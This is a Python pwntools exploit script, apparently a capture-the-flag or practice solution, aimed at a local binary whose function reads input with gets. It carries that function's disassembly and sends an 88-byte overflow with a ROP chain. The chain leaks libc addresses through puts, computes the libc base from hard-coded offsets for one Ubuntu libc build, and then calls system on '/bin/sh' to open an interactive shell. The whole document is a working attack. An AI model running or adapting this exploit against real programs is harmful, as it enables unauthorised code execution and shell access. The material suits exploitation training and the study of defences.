from pwn import *
"""
   0x0000000000400537 <+0>:     push   rbp
   0x0000000000400538 <+1>:     mov    rbp,rsp
   0x000000000040053b <+4>:     sub    rsp,0x50
   0x000000000040053f <+8>:     lea    rdi,[rip+0xae]        # 0x4005f4
   0x0000000000400546 <+15>:    call   0x400430 <puts@plt>
   0x000000000040054b <+20>:    lea    rax,[rbp-0x50]
   0x000000000040054f <+24>:    mov    rdi,rax
   0x0000000000400552 <+27>:    mov    eax,0x0
   0x0000000000400557 <+32>:    call   0x400440 <gets@plt>
   0x000000000040055c <+37>:    mov    eax,0x0
   0x0000000000400561 <+42>:    leave
   0x0000000000400562 <+43>:    ret
"""

p = process('./abc')
elf = ELF('./abc')
call_puts = p64(0x0000000000400546)
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])
gets_got =  p64(elf.got['gets'])
main = p64(0x400537)
pop_rdi = p64(0x00000000004005d3)
data_seg = p64(0x601028)

p.recvuntil(": \n")
raw_input("Checkpoint!")
pay = "A" * 88 + pop_rdi + puts_got +  puts_plt + pop_rdi + gets_got + puts_plt + main
p.sendline(pay)

puts_leak = p.readline().strip()[::-1].encode('hex')
gets_leak = p.readline().strip()[::-1].encode('hex')
puts_libc = int(puts_leak, base=16)
gets_libc = int(puts_leak, base=16)
print ('puts_leak',  puts_leak)
print ("gets_leak", gets_leak)

# refer https://libc.blukat.me/ for leaking libc version.

# for libc_leak libc6_2.27-3ubuntu1.4_amd64
system_offset = 0x4f550
binsh_offset = 0x1b3e1a
puts_offset = 0x080aa0

libc_base = puts_libc - puts_offset
system = p64(libc_base + system_offset)
binsh = p64(libc_base + binsh_offset)

pay = "A" * 88 + pop_rdi + binsh + system
p.sendline(pay)
p.interactive()
